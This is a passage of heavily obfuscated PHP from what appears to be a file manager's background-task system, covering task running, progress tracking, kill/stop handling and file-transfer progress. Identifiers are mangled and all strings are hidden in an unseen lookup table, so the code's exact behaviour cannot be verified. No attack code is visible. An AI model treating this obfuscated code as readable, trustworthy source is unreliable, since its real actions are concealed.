$÷¢®Ëî[1688]); die; } } public static function taskRun($ë‰åÓâ) { $ÏÁÔ¨ € =& $_SERVER[ˆûùúÊ¯]; self::log($ÏÁÔ¨ €[1689] . $ë‰åÓâ[$ÏÁÔ¨ €[451]] . $ÏÁÔ¨ €[1690] . $ë‰åÓâ[$ÏÁÔ¨ €[42]] . $ÏÁÔ¨ €[1691] . $ë‰åÓâ[$ÏÁÔ¨ €[1692]]); Model($ÏÁÔ¨ €[1673])->run($ë‰åÓâ[$ÏÁÔ¨ €[451]]); $Ø—ÎÚï = timeFloat(); $¿šà¼üÚ = $ÏÁÔ¨ €[12]; switch ($ë‰åÓâ[$ÏÁÔ¨ €[43]]) { case $ÏÁÔ¨ €[359]: $ú›ö¶¾· = url_request($ë‰åÓâ[$ÏÁÔ¨ €[1692]], $ÏÁÔ¨ €[254], !1, !1, !1, !1, 10); if ($ú›ö¶¾·[$ÏÁÔ¨ €[810]]) { $¿šà¼üÚ = strlen($ú›ö¶¾·[$ÏÁÔ¨ €[1263]]); } break; case $ÏÁÔ¨ €[253]: $¿šà¼üÚ = Hook::apply($ë‰åÓâ[$ÏÁÔ¨ €[1692]]); default: break; } Model($ÏÁÔ¨ €[1693])->add(array($ÏÁÔ¨ €[1694] => $ÏÁÔ¨ €[12], $ÏÁÔ¨ €[1695] => $ÏÁÔ¨ €[221], $ÏÁÔ¨ €[43] => $ÏÁÔ¨ €[1696] . $ë‰åÓâ[$ÏÁÔ¨ €[451]], $ÏÁÔ¨ €[1697] => json_encode(array($ÏÁÔ¨ €[42] => $ë‰åÓâ[$ÏÁÔ¨ €[42]], $ÏÁÔ¨ €[1698] => timeFloat() - $Ø—ÎÚï, $ÏÁÔ¨ €[345] => $¿šà¼üÚ)))); $Õù¤ä©• = $¿šà¼üÚ ? $ÏÁÔ¨ €[1699] . $¿šà¼üÚ : $ÏÁÔ¨ €[12]; self::log($ÏÁÔ¨ €[1700] . $ë‰åÓâ[$ÏÁÔ¨ €[451]] . $ÏÁÔ¨ €[174] . $Õù¤ä©•); return !0; } public static function valueGet($×¡åÀ±ú) { $ô‡úòô™ =& $_SERVER[ˆûùúÊ¯]; $ÓĞÍÑ¸‡ = $ô‡úòô™[1701]; $¹¸…Ãçö = Model($ô‡úòô™[484])->get($×¡åÀ±ú, $ÓĞÍÑ¸‡); if (is_null($¹¸…Ãçö)) { Model($ô‡úòô™[484])->set($ô‡úòô™[810], $ô‡úòô™[98], $ÓĞÍÑ¸‡); Model($ô‡úòô™[484])->set($ô‡úòô™[1660], $ô‡úòô™[221], $ÓĞÍÑ¸‡); $¹¸…Ãçö = Model($ô‡úòô™[484])->get($×¡åÀ±ú, $ÓĞÍÑ¸‡); } return $¹¸…Ãçö; } private static function valueSet($·Ş‚øÓ©, $üÜµ†¿ª) { $Õş”õåÀ =& $_SERVER[ˆûùúÊ¯]; $æÙ±Å“š = $Õş”õåÀ[1702]; CacheLock::lock($æÙ±Å“š); $¬¼–Âš = Model($Õş”õåÀ[484])->set($·Ş‚øÓ©, $üÜµ†¿ª, $Õş”õåÀ[1701]); CacheLock::unlock($æÙ±Å“š); return $¬¼–Âš; } protected static function log($—Â…“Æ) { write_log($—Â…“Æ, $_SERVER[ˆûùúÊ¯][1688]); } private static function cacheClear() { $ÒûÀ±¨ =& $_SERVER[ˆûùúÊ¯]; Cache::clearMemory(Model($ÒûÀ±¨[484])->cacheKey($ÒûÀ±¨[1701])); Cache::clearMemory(Model($ÒûÀ±¨[484])->cacheKey($ÒûÀ±¨[1703])); Model($ÒûÀ±¨[1673])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\x74\157\x70"; const STATYS_RUNNING = "\x72\x75\x6e\x6e\151\x6e\147"; const STATYS_KILL = "\153\x69\x6c\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($¤ÅÄŒº½, $ÂÀéÖ®ç = '', $ÏÈœÂş = 0, $ÇÚùö = '') { $«µ÷¬ë =& $_SERVER[ˆûùúÊ¯]; if (self::get($¤ÅÄŒº½)) { return; } $this->task = array($«µ÷¬ë[451] => $¤ÅÄŒº½, $«µ÷¬ë[1704] => USER_ID, $«µ÷¬ë[1601] => $ÇÚùö, $«µ÷¬ë[502] => $«µ÷¬ë[12], $«µ÷¬ë[43] => $ÂÀéÖ®ç, $«µ÷¬ë[1125] => $«µ÷¬ë[12], $«µ÷¬ë[846] => $ÏÈœÂş, $«µ÷¬ë[1705] => 0, $«µ÷¬ë[1706] => 0, $«µ÷¬ë[1707] => 0, $«µ÷¬ë[1708] => timeFloat(), $«µ÷¬ë[1709] => 0, $«µ÷¬ë[1710] => 0, $«µ÷¬ë[1711] => 0, $«µ÷¬ë[1712] => 0, $«µ÷¬ë[810] => $«µ÷¬ë[1660]); $GLOBALS[$«µ÷¬ë[1713]] = 1; Hook::bind($«µ÷¬ë[1664], array($this, $«µ÷¬ë[1714])); Hook::bind($«µ÷¬ë[1715], array($this, $«µ÷¬ë[1716])); $this->startAfter(); Hook::trigger($«µ÷¬ë[1717], $this->task); $this->task[$«µ÷¬ë[1710]] = timeFloat(); } public function end($ØŒ²‡¹— = '') { $®ùõööì =& $_SERVER[ˆûùúÊ¯]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$®ùõööì[1710]]) { self::valueSet($this->task[$®ùõööì[451]], !1); } $this->isEnd = !0; if ($ØŒ²‡¹—) { $this->task[$®ùõööì[502]] = $ØŒ²‡¹—; } self::log($®ùõööì[1718] . $this->task[$®ùõööì[451]] . $®ùõööì[1719] . sprintf($®ùõööì[911], timeFloat() - $this->task[$®ùõööì[1708]]) . $®ùõööì[1720]); Hook::unbind($®ùõööì[1664], array($this, $®ùõööì[1714])); Hook::unbind($®ùõööì[1715], array($this, $®ùõööì[1716])); $this->endAfter(); $õˆ§¦ªé = $this->task; $this->task = !1; Hook::trigger($®ùõööì[1721], $õˆ§¦ªé); } public function update($ª˜ÃÖ = 0, $¶¸ûº•Ô = false) { $ÜŒà°Óú =& $_SERVER[ˆûùúÊ¯]; $ º´œˆü =& $this->task; if (!$ º´œˆü) { return; } $ º´œˆü[$ÜŒà°Óú[1705]] += $ª˜ÃÖ; $ º´œˆü[$ÜŒà°Óú[1709]] = timeFloat(); if ($ º´œˆü[$ÜŒà°Óú[846]]) { if ($ º´œˆü[$ÜŒà°Óú[846]] < $ º´œˆü[$ÜŒà°Óú[1705]]) { $ º´œˆü[$ÜŒà°Óú[846]] = $ º´œˆü[$ÜŒà°Óú[1705]]; } $ÏÆÌÔøì = timeFloat() - $ º´œˆü[$ÜŒà°Óú[1708]] - $ º´œˆü[$ÜŒà°Óú[1711]]; if ($ÏÆÌÔøì <= 0) { $ÏÆÌÔøì = 0.001; } $ º´œˆü[$ÜŒà°Óú[1706]] = $ º´œˆü[$ÜŒà°Óú[1705]] / $ º´œˆü[$ÜŒà°Óú[846]]; $ º´œˆü[$ÜŒà°Óú[1707]] = $ º´œˆü[$ÜŒà°Óú[1705]] / $ÏÆÌÔøì; if ($ º´œˆü[$ÜŒà°Óú[1706]] > 0) { $ º´œˆü[$ÜŒà°Óú[1712]] = $ÏÆÌÔøì * (1 - $ º´œˆü[$ÜŒà°Óú[1706]]) / $ º´œˆü[$ÜŒà°Óú[1706]]; } $ º´œˆü[$ÜŒà°Óú[1712]] = $ º´œˆü[$ÜŒà°Óú[1712]] <= 0 ? 0 : $ º´œˆü[$ÜŒà°Óú[1712]]; } $this->updateAfter(); $®¾¯«½Ô = 0.2; if (timeFloat() - $ º´œˆü[$ÜŒà°Óú[1710]] < $®¾¯«½Ô && !$¶¸ûº•Ô) { return; } $³€õÀÍ = self::get($ º´œˆü[$ÜŒà°Óú[451]]); $àö‚ğ¬Ì = $³€õÀÍ[$ÜŒà°Óú[810]]; if ($àö‚ğ¬Ì == self::STATYS_KILL) { $íô–€Ü™ = array($ÜŒà°Óú[1722] => LNG($ÜŒà°Óú[1723]), $ÜŒà°Óú[1273] => !1); Cache::set($ÜŒà°Óú[1724] . $this->task[$ÜŒà°Óú[451]], $íô–€Ü™, 30); $this->onKill(); $this->end(); die; } else { if ($àö‚ğ¬Ì == self::STATYS_STOP) { $¢Ëï¤™É = 2; $³€õÀÍ[$ÜŒà°Óú[1711]] += $¢Ëï¤™É; self::valueSet($ º´œˆü[$ÜŒà°Óú[451]], $³€õÀÍ); sleep($¢Ëï¤™É); $this->update(); return; } } $ º´œˆü[$ÜŒà°Óú[810]] = $àö‚ğ¬Ì ? $àö‚ğ¬Ì : $ º´œˆü[$ÜŒà°Óú[810]]; $ º´œˆü[$ÜŒà°Óú[1711]] = $³€õÀÍ[$ÜŒà°Óú[1711]] ? $³€õÀÍ[$ÜŒà°Óú[1711]] : 0; $ º´œˆü[$ÜŒà°Óú[1710]] = timeFloat(); Hook::trigger($ÜŒà°Óú[1725], $ º´œˆü); self::valueSet($ º´œˆü[$ÜŒà°Óú[451]], $ º´œˆü); } public function onKillSet($ÊÕú–ã, $£×‘ƒï = array()) { $this->onKillCall = array($ÊÕú–ã, $£×‘ƒï); } public function onKill() { $Äì´×’û =& $_SERVER[ˆûùúÊ¯]; self::log($Äì´×’û[1718] . $this->task[$Äì´×’û[451]] . $Äì´×’û[1726]); Hook::trigger($Äì´×’û[1727], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($ÙÊ€¦ïÏ) { $Ú²±ÄÔÀ =& $_SERVER[ˆûùúÊ¯]; Cache::set($Ú²±ÄÔÀ[1724] . $this->task[$Ú²±ÄÔÀ[451]], $ÙÊ€¦ïÏ, 60); return $ÙÊ€¦ïÏ; } public static function get($Àôéú¸Ñ) { $ŒİäÆ«Î =& $_SERVER[ˆûùúÊ¯]; $€©À•Ê = self::valueGet($Àôéú¸Ñ); if (is_array($€©À•Ê) && $€©À•Ê[$ŒİäÆ«Î[1728]]) { $´ÎÍæ = ActionApply($€©À•Ê[$ŒİäÆ«Î[1728]], array($€©À•Ê)); $€©À•Ê = is_array($´ÎÍæ) ? $´ÎÍæ : $€©À•Ê; } return $€©À•Ê; } public static function listData() { $œØüê„ï = self::valueGet(); return array_sort_by($œØüê„ï, $_SERVER[ˆûùúÊ¯][1708], !0); } public static function kill($ËÒŸª¢ü) { return self::changeStatus($ËÒŸª¢ü, self::STATYS_KILL); } public static function stop($ò¤İ‰ÆÀ) { return self::changeStatus($ò¤İ‰ÆÀ, self::STATYS_STOP); } public static function restart($¶‚±á“ò) { return self::changeStatus($¶‚±á“ò, self::STATYS_RUNNING); } public static function killAll() { $Ó·”÷¿¼ =& $_SERVER[ˆûùúÊ¯]; $å¶‘£ñ½ = self::listData(); foreach ($å¶‘£ñ½ as $²½éÄÖ») { self::kill($²½éÄÖ»[$Ó·”÷¿¼[451]]); } sleep(2); foreach ($å¶‘£ñ½ as $²½éÄÖ») { self::valueSet($²½éÄÖ»[$Ó·”÷¿¼[451]], !1); } } private static function changeStatus($é™ˆáã, $ëŒìâ‰Ø) { $ÔÜÃë¯ =& $_SERVER[ˆûùúÊ¯]; $â’»“ù = self::valueGet($é™ˆáã); if (!$â’»“ù) { return !1; } $â’»“ù[$ÔÜÃë¯[810]] = $ëŒìâ‰Ø; self::valueSet($é™ˆáã, $â’»“ù); self::log($ÔÜÃë¯[1729] . $â’»“ù[$ÔÜÃë¯[451]] . $ÔÜÃë¯[1730] . $ëŒìâ‰Ø); return !0; } public static function valueGet($¹‹®±¨… = false) { $¤«ç™å× =& $_SERVER[ˆûùúÊ¯]; if ($¹‹®±¨…) { $À¨¥ç¾¯ = Model($¤«ç™å×[496])->where(array($¤«ç™å×[104] => $¹‹®±¨…, $¤«ç™å×[43] => $¤«ç™å×[1132]))->find(); return $À¨¥ç¾¯ ? json_decode($À¨¥ç¾¯[$¤«ç™å×[426]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($öˆ«öĞû = false) { $±û€©« =& $_SERVER[ˆûùúÊ¯]; $¢¾£µ” = array($±û€©«[43] => $±û€©«[1132]); if ($öˆ«öĞû) { $¢¾£µ”[$±û€©«[1704]] = $öˆ«öĞû; } $éÔŸÀ‘’ = Model($±û€©«[496])->where($¢¾£µ”)->select(); $éÔŸÀ‘’ = $éÔŸÀ‘’ ? $éÔŸÀ‘’ : array(); foreach ($éÔŸÀ‘’ as $–Š’™º‰ => $ø“Ò™Î½) { $éÔŸÀ‘’[$–Š’™º‰] = json_decode($ø“Ò™Î½[$±û€©«[426]], !0); } return $éÔŸÀ‘’; } public static function valueSet($ç»Üõ¹ù, $ù‘ª’»§) { $ÒŠÇùÁ¦ =& $_SERVER[ˆûùúÊ¯]; if (!$ù‘ª’»§) { return Model($ÒŠÇùÁ¦[496])->where(array($ÒŠÇùÁ¦[104] => $ç»Üõ¹ù, $ÒŠÇùÁ¦[43] => $ÒŠÇùÁ¦[1132]))->delete(); } $—ÛÅŸä = json_encode($ù‘ª’»§); if (!$—ÛÅŸä) { ob_start(); var_dump($ù‘ª’»§); $¿›í¨æ˜ = ob_get_clean(); self::log($ÒŠÇùÁ¦[1731] . json_encode_force($¿›í¨æ˜)); } if (!$ç»Üõ¹ù || !$ù‘ª’»§[$ÒŠÇùÁ¦[451]]) { return !1; } $ˆ‹ÊÍÄŒ = array($ÒŠÇùÁ¦[43] => $ÒŠÇùÁ¦[1132], $ÒŠÇùÁ¦[1704] => USER_ID, $ÒŠÇùÁ¦[104] => $ç»Üõ¹ù, $ÒŠÇùÁ¦[426] => $—ÛÅŸä); $î•º­Øé = $ÒŠÇùÁ¦[1732]; CacheLock::lock($î•º­Øé); Model($ÒŠÇùÁ¦[496])->add($ˆ‹ÊÍÄŒ, array(), !0); CacheLock::unlock($î•º­Øé); } public static function log($îı»ˆèĞ) { if (!GLOBAL_DEBUG) { return; } write_log($îı»ˆèĞ, $_SERVER[ˆûùúÊ¯][1733]); } } class TaskFileTransfer extends Task { protected function startAfter() { $àò­¼“Ÿ =& $_SERVER[ˆûùúÊ¯]; $Åú¨°ôË =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($àò­¼“Ÿ[1734], array($this, $àò­¼“Ÿ[1735])); Hook::bind($àò­¼“Ÿ[1284], array($this, $àò­¼“Ÿ[1736])); Hook::bind($àò­¼“Ÿ[1737], array($this, $àò­¼“Ÿ[1738])); Hook::bind($àò­¼“Ÿ[644], array($this, $àò­¼“Ÿ[1739])); Hook::bind($àò­¼“Ÿ[645], array($this, $àò­¼“Ÿ[1740])); Hook::bind($àò­¼“Ÿ[652], array($this, $àò­¼“Ÿ[1741])); Hook::bind($àò­¼“Ÿ[653], array($this, $àò­¼“Ÿ[1742])); Hook::bind($àò­¼“Ÿ[647], array($this, $àò­¼“Ÿ[1743])); Hook::bind($àò­¼“Ÿ[650], array($this, $àò­¼“Ÿ[1744])); Hook::bind($àò­¼“Ÿ[613], array($this, $àò­¼“Ÿ[1745])); Hook::bind($àò­¼“Ÿ[610], array($this, $àò­¼“Ÿ[1745])); Hook::bind($àò­¼“Ÿ[615], array($this, $àò­¼“Ÿ[1745])); Hook::bind($àò­¼“Ÿ[617], array($this, $àò­¼“Ÿ[1745])); Hook::bind($àò­¼“Ÿ[619], array($this, $àò­¼“Ÿ[1745])); Hook::bind($àò­¼“Ÿ[1746], array($this, $àò­¼“Ÿ[1747])); Hook::bind($àò­¼“Ÿ[635], array($this, $àò­¼“Ÿ[1748])); $this->sourceModelCopyFlag = !1; Hook::bind($àò­¼“Ÿ[1749], array($this, $àò­¼“Ÿ[1750])); Hook::bind($àò­¼“Ÿ[1751], array($this, $àò­¼“Ÿ[1752])); Hook::bind($àò­¼“Ÿ[1753], array($this, $àò­¼“Ÿ[1754])); $Åú¨°ôË[$àò­¼“Ÿ[1755]] = LNG($àò­¼“Ÿ[1756]); $Åú¨°ôË[$àò­¼“Ÿ[1757]] = 0; $Åú¨°ôË[$àò­¼“Ÿ[1758]] = 0; $Åú¨°ôË[$àò­¼“Ÿ[1125]] = $àò­¼“Ÿ[12]; $Åú¨°ôË[$àò­¼“Ÿ[1759]] = $àò­¼“Ÿ[12]; $Åú¨°ôË[$àò­¼“Ÿ[1760]] = 0; $Åú¨°ôË[$àò­¼“Ÿ[1761]] = 0; $Åú¨°ôË[$àò­¼“Ÿ[1762]] = 0; if (!$Åú¨°ôË[$àò­¼“Ÿ[1601]]) { $Åú¨°ôË[$àò­¼“Ÿ[1601]] = LNG($àò­¼“Ÿ[1763]); } } protected function endAfter() { $¿¶Ò’‘ =& $_SERVER[ˆûùúÊ¯]; Hook::unbind($¿¶Ò’‘[1734], array($this, $¿¶Ò’‘[1735])); Hook::unbind($¿¶Ò’‘[1284], array($this, $¿¶Ò’‘[1736])); Hook::unbind($¿¶Ò’‘[1737], array($this, $¿¶Ò’‘[1738])); Hook::unbind($¿¶Ò’‘[644], array($this, $¿¶Ò’‘[1739])); Hook::unbind($¿¶Ò’‘[645], array($this, $¿¶Ò’‘[1740])); Hook::unbind($¿¶Ò’‘[652], array($this, $¿¶Ò’‘[1741])); Hook::unbind($¿¶Ò’‘[653], array($this, $¿¶Ò’‘[1742])); Hook::unbind($¿¶Ò’‘[647], array($this, $¿¶Ò’‘[1743])); Hook::unbind($¿¶Ò’‘[650], array($this, $¿¶Ò’‘[1744])); Hook::unbind($¿¶Ò’‘[613], array($this, $¿¶Ò’‘[1745])); Hook::unbind($¿¶Ò’‘[610], array($this, $¿¶Ò’‘[1745])); Hook::unbind($¿¶Ò’‘[615], array($this, $¿¶Ò’‘[1745])); Hook::unbind($¿¶Ò’‘[617], array($this, $¿¶Ò’‘[1745])); Hook::unbind($¿¶Ò’‘[619], array($this, $¿¶Ò’‘[1745])); Hook::unbind($¿¶Ò’‘[1746], array($this, $¿¶Ò’‘[1747])); Hook::unbind($¿¶Ò’‘[635], array($this, $¿¶Ò’‘[1748])); Hook::unbind($¿¶Ò’‘[1749], array($this, $¿¶Ò’‘[1750])); Hook::unbind($¿¶Ò’‘[1751], array($this, $¿¶Ò’‘[1752])); Hook::unbind($¿¶Ò’‘[1753], array($this, $¿¶Ò’‘[1754])); } public function copyMoveStart($ä¾©¸ÅÂ, $¯ÖæÃœ¿, $ğ‡ëÜË, $¡˜î¿¬ ) { $¨ºêÉ¶ =& $_SERVER[ˆûùúÊ¯]; self::log($¨ºêÉ¶[1764] . $¯ÖæÃœ¿ . $¨ºêÉ¶[80] . $¡˜î¿¬ ); $ª…À—Éƒ = rtrim(TEMP_FILES, $¨ºêÉ¶[8]); if (substr($¯ÖæÃœ¿, 0, strlen($ª…À—Éƒ)) == $ª…À—Éƒ) { return; } if (substr($¡˜î¿¬ , 0, strlen($ª…À—Éƒ)) == $ª…À—Éƒ) { return; } $¬ÔÄÙâé =& $this->task; $¬ÔÄÙâé[$¨ºêÉ¶[1765]] = KodIO::transferType($ä¾©¸ÅÂ, $ğ‡ëÜË); $this->update(); } public function updateAfter() { $‚È¤ƒ• =& $_SERVER[ˆûùúÊ¯]; $ÏÅå¦‘ =& $this->task; if (!$ÏÅå¦‘[$‚È¤ƒ•[823]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($ÏÅå¦‘[$‚È¤ƒ•[1765]] == $‚È¤ƒ•[1376]) { return; } self::updateTask($ÏÅå¦‘); } private static function updateTask(&$ŠĞ³äª) { $¿µ‘¡—´ =& $_SERVER[ˆûùúÊ¯]; if ($ŠĞ³äª[$¿µ‘¡—´[1765]] == $¿µ‘¡—´[1255] || $ŠĞ³äª[$¿µ‘¡—´[1765]] == $¿µ‘¡—´[117]) { if ($ŠĞ³äª[$¿µ‘¡—´[1759]]) { $ŠĞ³äª[$¿µ‘¡—´[1762]] = $ŠĞ³äª[$¿µ‘¡—´[1761]] + $ŠĞ³äª[$¿µ‘¡—´[1758]]; } } else { if ($ŠĞ³äª[$¿µ‘¡—´[1765]] == $¿µ‘¡—´[1377]) { if ($ŠĞ³äª[$¿µ‘¡—´[1759]] == $¿µ‘¡—´[1255]) { $ŠĞ³äª[$¿µ‘¡—´[1762]] = $ŠĞ³äª[$¿µ‘¡—´[1761]] + $ŠĞ³äª[$¿µ‘¡—´[1758]] * 0.5; } else { if ($ŠĞ³äª[$¿µ‘¡—´[1759]] == $¿µ‘¡—´[117]) { $ŠĞ³äª[$¿µ‘¡—´[1762]] = $ŠĞ³äª[$¿µ‘¡—´[1761]] + $ŠĞ³äª[$¿µ‘¡—´[1757]] * 0.5 + $ŠĞ³äª[$¿µ‘¡—´[1758]] * 0.5; } } } } $ŠĞ³äª[$¿µ‘¡—´[1706]] = $ŠĞ³äª[$¿µ‘¡—´[1762]] / $ŠĞ³äª[$¿µ‘¡—´[823]]; if ($ŠĞ³äª[$¿µ‘¡—´[1706]] > 0) { $Âş÷­êÇ = timeFloat() - $ŠĞ³äª[$¿µ‘¡—´[1708]] - $ŠĞ³äª[$¿µ‘¡—´[1711]]; $ŠĞ³äª[$¿µ‘¡—´[1712]] = $Âş÷­êÇ * (1 - $ŠĞ³äª[$¿µ‘¡—´[1706]]) / $ŠĞ³äª[$¿µ‘¡—´[1706]]; } } public function addPath($‰Õ¦ÅÂ†) { $ú‡´ÈÄÊ =& $_SERVER[ˆûùúÊ¯]; if (!$‰Õ¦ÅÂ†) { return; } $ªæÁ°° =& $this->task; $á¤Æ¾û = IO::infoWithChildren($‰Õ¦ÅÂ†); $ šı‡úÃ = $ªæÁ°°[$ú‡´ÈÄÊ[1766]] ? $ªæÁ°°[$ú‡´ÈÄÊ[1766]][$ú‡´ÈÄÊ[1767]] : 0; $ªæÁ°°[$ú‡´ÈÄÊ[1766]] = array($ú‡´ÈÄÊ[1767] => $ šı‡úÃ + 1, $ú‡´ÈÄÊ[470] => $á¤Æ¾û[$ú‡´ÈÄÊ[42]], $ú‡´ÈÄÊ[94] => $á¤Æ¾û[$ú‡´ÈÄÊ[94]], $ú‡´ÈÄÊ[559] => $á¤Æ¾û[$ú‡´ÈÄÊ[559]] ? $á¤Æ¾û[$ú‡´ÈÄÊ[559]] : $á¤Æ¾û[$ú‡´ÈÄÊ[94]]); if ($á¤Æ¾û[$ú‡´ÈÄÊ[43]] == $ú‡´ÈÄÊ[223]) { $ªæÁ°°[$ú‡´ÈÄÊ[846]] += 1; } else { $ªæÁ°°[$ú‡´ÈÄÊ[846]] += $á¤Æ¾û[$ú‡´ÈÄÊ[89]][$ú‡´ÈÄÊ[87]]; if ($á¤Æ¾û[$ú‡´ÈÄÊ[190]]) { $ªæÁ°°[$ú‡´ÈÄÊ[846]] += $á¤Æ¾û[$ú‡´ÈÄÊ[89]][$ú‡´ÈÄÊ[88]] + 1; } } $ªæÁ°°[$ú‡´ÈÄÊ[823]] += $á¤Æ¾û[$ú‡´ÈÄÊ[86]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($´”è…ë) { } public function sourceAddHashEnd($Ù„è©­­) { } public function sourceAddFileStart($òÔ Ë­ã) { $‹¨®¤ôø =& $_SERVER[ˆûùúÊ¯]; $¼ÀĞÚÅî =& $this->task; $¼ÀĞÚÅî[$‹¨®¤ôø[1757]] = $òÔ Ë­ã[$‹¨®¤ôø[86]]; $¼ÀĞÚÅî[$‹¨®¤ôø[1755]] = $òÔ Ë­ã[$‹¨®¤ôø[42]]; $¼ÀĞÚÅî[$‹¨®¤ôø[1125]] = $òÔ Ë­ã[$‹¨®¤ôø[42]]; $¼ÀĞÚÅî[$‹¨®¤ôø[1768]] = $òÔ Ë­ã[$‹¨®¤ôø[94]]; $this->update(); } public function sourceAddFileEnd($­Ÿ’øƒÛ) { $‰àÔªÈŠ =& $_SERVER[ˆûùúÊ¯]; $Šë¥¥¾ë =& $this->task; $Šë¥¥¾ë[$‰àÔªÈŠ[1762]] += $­Ÿ’øƒÛ[$‰àÔªÈŠ[86]]; $Šë¥¥¾ë[$‰àÔªÈŠ[1768]] = $­Ÿ’øƒÛ[$‰àÔªÈŠ[94]]; $this->update(1); } public function copyFileStart($œÇ¬³¿Æ, $©ö•öàÈ, $¶ÆÏÏ€, $ª˜îø×, $·º¶ç, $äá£Ñúî) { $šİ›…ÎÌ =& $_SERVER[ˆûùúÊ¯]; $±ÕÜå¤º = $·º¶ç; if ($±ÕÜå¤º == $GLOBALS[$šİ›…ÎÌ[1769]]) { $±ÕÜå¤º = $GLOBALS[$šİ›…ÎÌ[1770]]; } $GLOBALS[$šİ›…ÎÌ[1770]] = $·º¶ç; $GLOBALS[$šİ›…ÎÌ[1769]] = $äá£Ñúî; $Ø†ÄÂ÷ =& $this->task; $Ø†ÄÂ÷[$šİ›…ÎÌ[1755]] = $±ÕÜå¤º; $Ø†ÄÂ÷[$šİ›…ÎÌ[1757]] = (int) $œÇ¬³¿Æ->size($©ö•öàÈ); $Ø†ÄÂ÷[$šİ›…ÎÌ[1758]] = 0; $Ø†ÄÂ÷[$šİ›…ÎÌ[1125]] = $šİ›…ÎÌ[12]; $Ø†ÄÂ÷[$šİ›…ÎÌ[1759]] = $šİ›…ÎÌ[12]; $Ø†ÄÂ÷[$šİ›…ÎÌ[1760]] = 0; $é³”Èä˜ = $Ø†ÄÂ÷[$šİ›…ÎÌ[1757]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($Ø†ÄÂ÷[$šİ›…ÎÌ[451]] . $šİ›…ÎÌ[1771]); if ($é³”Èä˜ && file_exists(get_path_father($ª˜îø×))) { Cache::set($Ø†ÄÂ÷[$šİ›…ÎÌ[451]] . $šİ›…ÎÌ[1771], $ª˜îø×); $Ø†ÄÂ÷[$šİ›…ÎÌ[1728]] = array($šİ›…ÎÌ[1772], $šİ›…ÎÌ[1773]); } $this->update(0, $é³”Èä˜); } public static function updateCopyLocalFileSize($Ç‹ø¹­) { $ÄÙ—ÊÏÉ =& $_SERVER[ˆûùúÊ¯]; $úµ‘°Ô = Cache::get($Ç‹ø¹­[$ÄÙ—ÊÏÉ[451]] . $ÄÙ—ÊÏÉ[1771]); if (!$úµ‘°Ô || !file_exists($úµ‘°Ô)) { return $Ç‹ø¹­; } $Ç‹ø¹­[$ÄÙ—ÊÏÉ[1758]] = @filesize($úµ‘°Ô); $Ç‹ø¹­[$ÄÙ—ÊÏÉ[1762]] += $Ç‹ø¹­[$ÄÙ—ÊÏÉ[1758]]; self::updateTask($Ç‹ø¹­); return $Ç‹ø¹­; } public function copyFileEnd($°ä„òÜÃ, $ É¾ü, $Ö®È§ºî, $·é‡”Îõ, $ŒÒªşÕÔ, $ÔˆÖô£ü) { $¬‚ıÛôú =& $_SERVER[ˆûùúÊ¯]; $¶¨³¯ı÷ =& $this->task; $¶¨³¯ı÷[$¬‚ıÛôú[1758]] = $¶¨³¯ı÷[$¬‚ıÛôú[1757]]; $¶¨³¯ı÷[$¬‚ıÛôú[1759]] = $¬‚ıÛôú[12]; unset($¶¨³¯ı÷[$¬‚ıÛôú[1728]]); if ($ŒÒªşÕÔ == $¶¨³¯ı÷[$¬‚ıÛôú[1755]]) { $¶¨³¯ı÷[$¬‚ıÛôú[1761]] += $¶¨³¯ı÷[$¬‚ıÛôú[1757]]; $¶¨³¯ı÷[$¬‚ıÛôú[1762]] = $¶¨³¯ı÷[$¬‚ıÛôú[1761]]; $áÁŞéá“ = 1; if (isset($¶¨³¯ı÷[$¬‚ıÛôú[1768]]) && $¶¨³¯ı÷[$¬‚ıÛôú[1768]] == $ É¾ü) { $áÁŞéá“ = 0; } $this->update($áÁŞéá“); } else { $this->update(); $¶¨³¯ı÷[$¬‚ıÛôú[1758]] = 0; } Cache::remove($¶¨³¯ı÷[$¬‚ıÛôú[451]] . $¬‚ıÛôú[1771]); self::log($¬‚ıÛôú[1774] . $ É¾ü . $¬‚ıÛôú[80] . $·é‡”Îõ . $¬‚ıÛôú[18] . $ŒÒªşÕÔ . $¬‚ıÛôú[1775] . $¶¨³¯ı÷[$¬‚ıÛôú[1755]]); } public function updateFileEnd($ç³¢Œ¦, $¦Î¤º¡) { $„¨íñ–ó =& $_SERVER[ˆûùúÊ¯]; $«ÀÇ¤ç¿ =& $this->task; $«ÀÇ¤ç¿[$„¨íñ–ó[1755]] = $ç³¢Œ¦; $«ÀÇ¤ç¿[$„¨íñ–ó[1757]] = $¦Î¤º¡; $«ÀÇ¤ç¿[$„¨íñ–ó[1761]] += $¦Î¤º¡; $«ÀÇ¤ç¿[$„¨íñ–ó[1762]] = $«ÀÇ¤ç¿[$„¨íñ–ó[1761]]; $this->update(1); self::log($„¨íñ–ó[1776] . $ç³¢Œ¦); } public function sourceModelCopy($¨Øš˜´Û) { $õ¾çË€¾ =& $_SERVER[ˆûùúÊ¯]; $ÙÚ¦©Ù = $¨Øš˜´Û[0]; $Ÿ‚ù‰ = $¨Øš˜´Û[1]; $Ôº£‘°Ÿ =& $this->task; $this->sourceModelCopyFlag = !0; $¯è’Ñªš = 0; switch ($ÙÚ¦©Ù) { case $õ¾çË€¾[611]: $¯è’Ñªš = 1; break; case $õ¾çË€¾[614]: $Ôº£‘°Ÿ[$õ¾çË€¾[1755]] = $Ÿ‚ù‰[$õ¾çË€¾[42]]; break; case $õ¾çË€¾[616]: $¯è’Ñªš = intval($¨Øš˜´Û[$õ¾çË€¾[432]] * 0.4); break; case $õ¾çË€¾[618]: $¯è’Ñªš = intval($¨Øš˜´Û[$õ¾çË€¾[432]] * 0.2); break; case $õ¾çË€¾[620]: $¯è’Ñªš = intval($¨Øš˜´Û[$õ¾çË€¾[432]] * 0.4); break; } $this->update($¯è’Ñªš); $this->sourceModelCopyFlag = !1; } public function 